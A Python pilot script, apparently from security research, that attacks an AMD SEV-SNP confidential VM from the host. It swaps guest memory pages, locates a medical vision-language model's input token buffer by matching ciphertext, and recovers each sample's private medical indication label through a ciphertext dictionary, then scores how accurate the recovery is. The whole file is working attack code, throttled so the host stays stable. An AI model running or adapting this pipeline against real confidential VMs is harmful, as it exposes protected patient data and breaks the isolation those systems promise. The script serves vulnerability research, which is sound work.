#!/usr/bin/env python3
"""
llm_batch_pilot.py — small pilot of the full host-only pipeline across
MULTIPLE samples, using ADAPTIVE 2MB-block caching.

Why adaptive caching: a 30-sample survey (guest-reported bases, grading-only,
no swaps) found input_ids bases are NOT tightly clustered (span ~70MB), but
DO reuse a handful of 2MB blocks for 2-4 consecutive samples before advancing
by exactly one 2MB step (0x200000) -- looks like 2 alternating bump-allocator
arenas. So per-sample localization tries known blocks first (continuation
from their last-used offset, then a "+1 block" guess) before falling back to
a fresh discovery scan.

Scoped to single-page input_ids buffers (header + N_image_pad + indication
<= ~512 tokens) -- multi-page buffers need a page0-vs-midpad disambiguation
this pilot doesn't implement yet.

The guest reports its GPA/indication for grading ONLY -- host_base is always
derived from the image_pad ciphertext scan; sweep_blind (fully-blind path,
early-stop patched) never sees guest-reported values.

Bootstrap seeding: the very first sample of a run gets its 2MB search block
from ITS OWN grading peek (same process, one-time only -- see main()'s
self_seed_used logic). Do NOT pass --bootstrap-block from a value learned by
a SEPARATE process invocation (e.g. an earlier cluster_check.py run) --
single_inference_indication_gpa.py --stdin-loop is a fresh process each
launch with its own ASLR base, so an address from a different process does
not carry over. Live-validated 2026-09-04: a full 512-page scan against such
a stale cross-process guess came back 0/256 hits on every page.

Usage:
  sudo PYTHONPATH=dict python3 llm_batch_pilot.py --indices 2,9,12,17,26,31,34,36
"""
import argparse
import csv
import json
import re
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE / "dict"))
sys.path.insert(0, str(HERE.parent / "mura" / "dict"))
sys.path.insert(0, str(HERE))

from mura_dict_build import (  # noqa: E402
    acquire_gpa, do_swap_read, parse_dump, ensure_mtu_9000, drain_rxbuf,
    CHUNK_SIZE, CHUNKS_PAGE, PAGE_SIZE, SWAP_PACE_SEC,
    SWAP_BURST_COOLDOWN, SWAP_BURST_SLEEP,
)
import numpy as np  # noqa: E402
import orchestrate_v4 as o  # noqa: E402

SWAP_TOOL = str(HERE / "swap_pages_tool")
IMAGE_PAD_TOKEN_ID = 151655
SCAN_TMP = HERE / "scan_tmp_llm"
DICT_CACHE = HERE / "dict_cache_v4.json"
OUT_CSV = HERE / "pilot_results.csv"
BLOCK = 0x200000
PAGES_PER_BLOCK = BLOCK // PAGE_SIZE
IMAGE_PAD_MATCH_MIN = 40

# ---------------------------------------------------------------------------
# Safety ceilings — added 2026-09-04 after this pilot's first (unbounded)
# version rebooted the host. Root cause: locate_base() could chain up to 5
# full-block (512-page) scans per sample with no cap (continuation x2 +
# next-block x2 + bootstrap), i.e. up to ~2560 swaps for ONE sample with no
# circuit breaker — a scale of sustained snp_guest_page_move load never
# validated by the single-phase workloads (MURA infer()=49 pages, MNIST
# --scan-block=512 pages ONCE, LLM build=34 phases) the 0.25s/10-swap
# pacing constants were tuned against. Per-swap pacing alone was not proven
# safe at that cascade scale, so this version bounds total swap volume
# directly, at three independent layers: per-try, per-sample, and per-run.
# ---------------------------------------------------------------------------
CONTINUE_TRY_BUDGET  = 200   # budget for a "continuation" try (resuming from
                              # a KNOWN offset within a KNOWN block, forward
                              # only) — covers the observed 100-280 page
                              # within-block offset drift with margin.
FULL_BLOCK_TRY_BUDGET = PAGES_PER_BLOCK  # 512 — budget for a try that has NO
                              # informed starting offset at all (a fresh
                              # "next block" guess, or the bootstrap seed):
                              # the real page can land anywhere in [0,511].
                              # Live-validated 2026-09-04: a 200-page cap on
                              # this kind of try MISSED a real base at page
                              # 414 of its (correctly-guessed) block — the
                              # block guess was right, the budget was the
                              # bug. Do not reuse CONTINUE_TRY_BUDGET here.
MAX_LOC_SWAPS_SAMPLE  = 1450  # hard ceiling on localization swaps for ONE
                              # sample (sized for the worst-case try plan:
                              # 2x continuation@200 + next-block@512 +
                              # bootstrap@512 = 1424, +margin). This is
                              # SECONDARY to MAX_TOTAL_SWAPS_RUN below, which
                              # remains the dominant, always-enforced ceiling
                              # — one pathological sample consuming most of
                              # it and triggering the run breaker is the
                              # correct, safe outcome, not a bug.
MAX_TOTAL_SWAPS_RUN   = 1500  # circuit breaker for the WHOLE pilot run —
                              # abort the entire batch (not just one sample)
                              # if cumulative swaps ever reach this
MEGA_COOLDOWN_EVERY   = 50    # extra long pause every N swaps, on top of the
                              # existing 10-swap/2s burst cooldown — defense
                              # in depth since the exact PSP failure mode is
                              # not fully characterized
MEGA_COOLDOWN_SLEEP   = 12.0
INTER_TRY_SETTLE_SEC  = 1.5   # pause when switching localization strategy
                              # (continuation -> next-block -> bootstrap),
                              # so a failed try's tail never runs straight
                              # into a new scan target with zero gap

KEY = "/home/eun/.ssh/id_ed25519"
GUEST = "ubuntu@localhost"; GPORT = "7777"
GUEST_PY = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_CWD = "~/medical_ml/med_vlm/scripts"
GSCRIPT = "single_inference_indication_gpa.py"
SSH = ["ssh", "-p", GPORT, "-i", KEY, "-o", "BatchMode=yes",
       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8", GUEST]


def _blk(b, j): return b[j*CHUNK_SIZE:(j+1)*CHUNK_SIZE]
def imagepad_chunk(): return np.array([IMAGE_PAD_TOKEN_ID]*2, dtype="<i8").tobytes()


def read_at_fixed(fixed, src, tag):
    SCAN_TMP.mkdir(exist_ok=True)
    tmp = SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed, src, tmp, SWAP_TOOL)
    d = parse_dump(tmp); tmp.unlink(missing_ok=True); return d


def valid_imagepad_ref(fixed, zero, tries=5):
    best, best_mask = None, set()
    for t in range(tries):
        g = acquire_gpa(IMAGE_PAD_TOKEN_ID, chunk_bytes=imagepad_chunk())
        cur = read_at_fixed(fixed, g, f"ip{t}")
        mask = {j for j in range(CHUNKS_PAGE) if _blk(cur, j) != _blk(zero, j)}
        if len(mask) > len(best_mask):
            best, best_mask = cur, mask
        if len(best_mask) >= 200:
            break
        try: drain_rxbuf(rounds=1)
        except Exception: pass
        time.sleep(1)
    return best, best_mask


class RunAborted(Exception):
    """Raised when the global swap circuit breaker trips."""


class Pacer:
    """Two-tier pacing: the existing 10-swap/2s burst cooldown, PLUS an
    extra longer cooldown every MEGA_COOLDOWN_EVERY swaps. Both layered on
    top of the base 0.25s inter-swap sleep. Also enforces the global
    MAX_TOTAL_SWAPS_RUN circuit breaker — every single swap in this script
    (localization AND, via the shared counter passed into sweep_blind's
    caller-side accounting, matching) must go through this."""
    def __init__(self):
        self.n = 0

    def tick(self):
        if self.n >= MAX_TOTAL_SWAPS_RUN:
            raise RunAborted(
                f"MAX_TOTAL_SWAPS_RUN={MAX_TOTAL_SWAPS_RUN} reached "
                f"(n={self.n}) — aborting entire pilot run")
        if MEGA_COOLDOWN_EVERY and self.n and self.n % MEGA_COOLDOWN_EVERY == 0:
            print(f"  [pace] MEGA cooldown after {self.n} total swaps "
                  f"({MEGA_COOLDOWN_SLEEP:.0f}s)")
            time.sleep(MEGA_COOLDOWN_SLEEP)
        elif SWAP_BURST_COOLDOWN and self.n and self.n % SWAP_BURST_COOLDOWN == 0:
            time.sleep(SWAP_BURST_SLEEP)
        else:
            time.sleep(SWAP_PACE_SEC)
        self.n += 1


def scan_pages(fixed, ip_ref, ip_mask, block_base, start_page, end_page, pacer, budget):
    """Dense-scan pages [start_page, end_page] (inclusive) of block_base.
    Returns (best_page, best_hits, swaps_used) or (None, 0, swaps_used) if
    nothing clears IMAGE_PAD_MATCH_MIN within budget swaps."""
    best_page, best_hits, swaps = None, -1, 0
    for pg in range(start_page, end_page + 1):
        if swaps >= budget:
            break
        page = block_base + pg * PAGE_SIZE
        pacer.tick(); swaps += 1
        data = read_at_fixed(fixed, page, "pg")
        hits = sum(1 for j in ip_mask if _blk(data, j) == _blk(ip_ref, j))
        if hits > best_hits:
            best_page, best_hits = page, hits
        if hits >= IMAGE_PAD_MATCH_MIN:
            return page, hits, swaps
    return None, best_hits, swaps


def locate_base(fixed, ip_ref, ip_mask, known: dict, recency: list, pacer,
                 bootstrap_block: int):
    """Adaptive localization, swap-bounded at every layer:
      - a "narrow" try (continuing forward from a KNOWN offset in a KNOWN
        block) gets CONTINUE_TRY_BUDGET (200) — informed guess, small range;
      - a "full" try (a fresh block with NO offset information — next-block
        guess or bootstrap seed) gets FULL_BLOCK_TRY_BUDGET (512) — the real
        page can be anywhere in the block, a narrow budget just misses it
        (live-validated failure mode, 2026-09-04);
      - up to 2 known arenas are tried (recency[:2]) before falling back to
        the bootstrap seed, so alternating-arena reuse (observed in the
        30-sample survey) has a real chance without an unbounded cascade;
      - the whole sample's localization aborts (LOC_FAIL) once
        MAX_LOC_SWAPS_SAMPLE is spent, instead of cascading further —
        MAX_TOTAL_SWAPS_RUN (checked every single swap via pacer.tick())
        remains the dominant, always-enforced ceiling regardless;
      - a settle pause separates tries so switching scan target never runs
        into a failed try's tail with zero gap.
    known: {block_base: last_offset_page}. recency: list of block_base,
    most-recent-first. Returns (host_base, swaps_used, strategy_label) or
    (None, swaps_used, 'FAIL')."""
    total_swaps = 0
    tried = []

    def try_range(blk, lo, hi, budget_cap, label):
        nonlocal total_swaps
        if total_swaps >= MAX_LOC_SWAPS_SAMPLE:
            return None
        budget = min(budget_cap, MAX_LOC_SWAPS_SAMPLE - total_swaps, hi - lo + 1)
        page, hits, sw = scan_pages(fixed, ip_ref, ip_mask, blk, lo,
                                    min(hi, lo + budget - 1), pacer, budget)
        total_swaps += sw
        tried.append((label, blk, lo, hi, sw, hits))
        print(f"    [loc-try] {label}  pages=[{lo},{min(hi, lo + budget - 1)}]"
              f"  swaps={sw}  best_hits={hits}  {'HIT' if page else 'miss'}")
        if page is None and total_swaps < MAX_LOC_SWAPS_SAMPLE:
            time.sleep(INTER_TRY_SETTLE_SEC)
        return page

    # (block, lo, hi, budget, label)
    plan = []
    for blk in recency[:2]:
        plan.append((blk, known[blk], PAGES_PER_BLOCK - 1, CONTINUE_TRY_BUDGET,
                     f"continue@0x{blk:x}"))
    for blk in recency[:2]:
        nxt = blk + BLOCK
        plan.append((nxt, 0, PAGES_PER_BLOCK - 1, FULL_BLOCK_TRY_BUDGET,
                     f"next-block@0x{nxt:x}"))
    if bootstrap_block is not None:
        plan.append((bootstrap_block, 0, PAGES_PER_BLOCK - 1, FULL_BLOCK_TRY_BUDGET,
                     f"bootstrap@0x{bootstrap_block:x}"))

    for blk, lo, hi, budget_cap, label in plan:
        if total_swaps >= MAX_LOC_SWAPS_SAMPLE:
            print(f"    [loc] MAX_LOC_SWAPS_SAMPLE={MAX_LOC_SWAPS_SAMPLE} "
                  f"reached — abandoning remaining tries")
            break
        p = try_range(blk, lo, hi, budget_cap, label)
        if p:
            return p, total_swaps, label

    return None, total_swaps, "FAIL"


def hold_guest(g, index):
    g.stdin.write(f"{index}\n"); g.stdin.flush()
    gt = {"base": None, "N": None, "tok_start": None, "ind": None}
    grab_ind = False
    for l in g.stdout:
        if "INDICATION (sample id" in l:
            grab_ind = True; continue
        if grab_ind and gt["ind"] is None and l.strip() and "====" not in l:
            gt["ind"] = l.strip(); grab_ind = False
        m = re.search(r"input_ids base page GPA:\s+0x([0-9a-f]+)", l, re.I)
        if m: gt["base"] = int(m.group(1), 16)
        m = re.search(r"N_image_pad:\s+(\d+)", l)
        if m: gt["N"] = int(m.group(1))
        m = re.search(r"tok_start:\s+(\d+)", l)
        if m: gt["tok_start"] = int(m.group(1))
        if "HOLDING" in l: break
    return gt


def release_guest(g):
    g.stdin.write("NEXT\n"); g.stdin.flush()
    for l in g.stdout:
        if "RELEASED" in l: break


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--indices", default="2,9,12,17,26,31,34,36")
    p.add_argument("--bootstrap-block", default=None,
                   help="OVERRIDE: 2MB block to seed the very first sample's "
                        "search with, skipping the automatic self-seed below. "
                        "Live-validated 2026-09-04 that this is normally "
                        "WRONG to pass explicitly: single_inference_"
                        "indication_gpa.py --stdin-loop is a fresh process "
                        "each launch, so a block address learned from ANY "
                        "separate process invocation (e.g. an earlier "
                        "cluster_check.py run) does not carry over — a "
                        "512-page full-block scan against such a stale guess "
                        "came back 0/256 hits on every single page. Leave "
                        "unset unless you have a same-process-verified block.")
    args = p.parse_args()
    indices = [int(x) for x in args.indices.split(",")]
    cli_bootstrap_block = int(args.bootstrap_block, 0) if args.bootstrap_block else None

    if not DICT_CACHE.exists():
        print(f"[!] {DICT_CACHE} missing", file=sys.stderr); return
    cache = json.load(open(DICT_CACHE))
    print(f"[pilot] dict loaded: {len(cache)} offset keys")
    print(f"[pilot] indices: {indices}")

    ensure_mtu_9000()
    cmd = (f"cd {GUEST_CWD} && sudo {GUEST_PY} -u {GSCRIPT} "
           f"--gpa-only --calibrate --stdin-loop")
    g = subprocess.Popen(SSH + [cmd], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, bufsize=1)
    for l in g.stdout:
        if "LOOP_READY" in l: break

    fixed = acquire_gpa(None)
    zero = read_at_fixed(fixed, acquire_gpa(None), "zero")
    ip_ref, ip_mask = valid_imagepad_ref(fixed, zero)
    print(f"[pilot] image_pad ref: {len(ip_mask)}/256 confirmed offsets")
    if len(ip_mask) < 100:
        print("[!] weak ref, aborting", file=sys.stderr); return

    pacer = Pacer()
    known: dict = {}
    recency: list = []
    self_seed_used = False

    # Route sweep_blind()'s matching-phase swaps through the SAME pacer/
    # circuit-breaker as localization. sweep_blind has its own independent
    # pacing (kept as a second, defense-in-depth layer inside
    # orchestrate_v4.py, including MAX_SWAPS_PER_SWEEP) but its swap count
    # was previously invisible to this script's global counter/breaker —
    # that gap is why the pre-incident version's "match_swaps" was always
    # computed as 0. Wrapping the actual swap primitive closes it: every
    # snp_guest_page_move round-trip in this process, from either phase,
    # now passes through one place.
    _orig_swap_read_raw = o._swap_read_raw
    swap_counts = {"match": 0}

    def _traced_swap_read_raw(swap_tool, dict_gpa, ind_page_gpa):
        pacer.tick()  # may raise RunAborted — propagates up through sweep_blind
        swap_counts["match"] += 1
        return _orig_swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)

    o._swap_read_raw = _traced_swap_read_raw

    rows = []
    t0 = time.time()
    aborted = False
    try:
        for i, idx in enumerate(indices):
            print(f"\n{'='*70}\n[pilot] {i+1}/{len(indices)}  index={idx}  "
                  f"(cumulative swaps so far: {pacer.n})\n{'='*70}")
            gt = hold_guest(g, idx)
            print(f"  GT(grade): base=0x{(gt['base'] or 0):x} N={gt['N']} "
                  f"tok_start={gt['tok_start']}  indication={gt['ind']!r}")

            # One-time bootstrap seed, same process only. NOT a per-sample
            # crutch: this fires at most once per run (guarded by
            # self_seed_used), only when we have zero adaptive knowledge yet
            # (recency empty) and no CLI override was given. All localization
            # from here on — this sample's PAGE-level search within the
            # seeded block, and every later sample's block+page search — is
            # still done via the host-only image_pad scan, never the guest
            # GPA directly.
            this_bootstrap = None
            if not recency and not self_seed_used:
                if cli_bootstrap_block is not None:
                    this_bootstrap = cli_bootstrap_block
                elif gt["base"] is not None:
                    this_bootstrap = gt["base"] & ~(BLOCK - 1)
                    self_seed_used = True
                    print(f"  [bootstrap] one-time self-seed: block "
                          f"0x{this_bootstrap:x} (this sample's own grading "
                          f"peek, same process — see --bootstrap-block help)")

            host_base, loc_swaps, strategy = locate_base(
                fixed, ip_ref, ip_mask, known, recency, pacer, this_bootstrap)

            row = {"index": idx, "indication": gt["ind"], "gt_base": hex(gt["base"] or 0),
                   "host_base": hex(host_base) if host_base else "", "loc_strategy": strategy,
                   "loc_swaps": loc_swaps, "loc_match": host_base == gt["base"],
                   "verdict": "", "n_matches": 0, "labels": "", "match_swaps": 0}

            if host_base is None:
                print(f"  [B] LOCALIZATION FAILED after {loc_swaps} swaps")
                row["verdict"] = "LOC_FAIL"
            else:
                blk = host_base & ~(BLOCK - 1)
                off = (host_base - blk) // PAGE_SIZE
                known[blk] = off
                if blk in recency: recency.remove(blk)
                recency.insert(0, blk)
                print(f"  [B] host_base=0x{host_base:x}  strategy={strategy}  "
                      f"swaps={loc_swaps}  match_GT={host_base == gt['base']}")

                n_before = swap_counts["match"]
                matches, N_est = o.sweep_blind(host_base, cache, SWAP_TOOL)
                match_swaps = swap_counts["match"] - n_before
                row["match_swaps"] = match_swaps
                labels = [m["label"] for m in matches] if matches else []
                row["verdict"] = "MATCH" if len(labels) == 1 else ("MULTI_MATCH" if labels else "NO_MATCH")
                row["n_matches"] = len(labels)
                row["labels"] = " / ".join(labels)
                ok = any(lbl.strip().lower() in (gt["ind"] or "").lower() for lbl in labels)
                row["label_correct"] = ok
                print(f"  [C] verdict={row['verdict']}  labels={labels}  "
                      f"correct={ok}  match_swaps={match_swaps}")

            rows.append(row)
            release_guest(g)
    except RunAborted as e:
        aborted = True
        print(f"\n[!!!] RUN ABORTED (circuit breaker): {e}", file=sys.stderr)
    finally:
        o._swap_read_raw = _orig_swap_read_raw

    elapsed = time.time() - t0
    fieldnames = ["index", "indication", "gt_base", "host_base", "loc_strategy",
                  "loc_swaps", "loc_match", "verdict", "n_matches", "labels",
                  "label_correct", "match_swaps"]
    with open(OUT_CSV, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=fieldnames)
        w.writeheader()
        for r in rows:
            w.writerow({k: r.get(k, "") for k in fieldnames})

    print("\n" + "=" * 70)
    print(f"  PILOT SUMMARY  ({len(rows)}/{len(indices)} samples processed"
          f"{' — ABORTED by circuit breaker' if aborted else ''}, "
          f"{elapsed:.0f}s, {pacer.n} total swaps"
          f"{f' (>= breaker {MAX_TOTAL_SWAPS_RUN})' if aborted else ''})")
    print("=" * 70)
    if rows:
        n_loc_ok = sum(1 for r in rows if r.get("loc_match"))
        n_recovered = sum(1 for r in rows if r["verdict"] in ("MATCH", "MULTI_MATCH"))
        n_correct = sum(1 for r in rows if r.get("label_correct"))
        avg_loc_swaps = sum(r["loc_swaps"] for r in rows) / len(rows)
        print(f"  localization correct : {n_loc_ok}/{len(rows)}")
        print(f"  avg swaps/sample (loc): {avg_loc_swaps:.0f}")
        print(f"  any label recovered  : {n_recovered}/{len(rows)}")
        print(f"  recovered label true : {n_correct}/{len(rows)}")
    else:
        print("  (no samples completed before abort)")
    print(f"  known blocks discovered: {len(known)}")
    print(f"  saved -> {OUT_CSV}")
    print("=" * 70)

    try:
        g.stdin.write("QUIT\n"); g.stdin.flush(); g.wait(timeout=15)
    except Exception:
        g.kill()


if __name__ == "__main__":
    main()
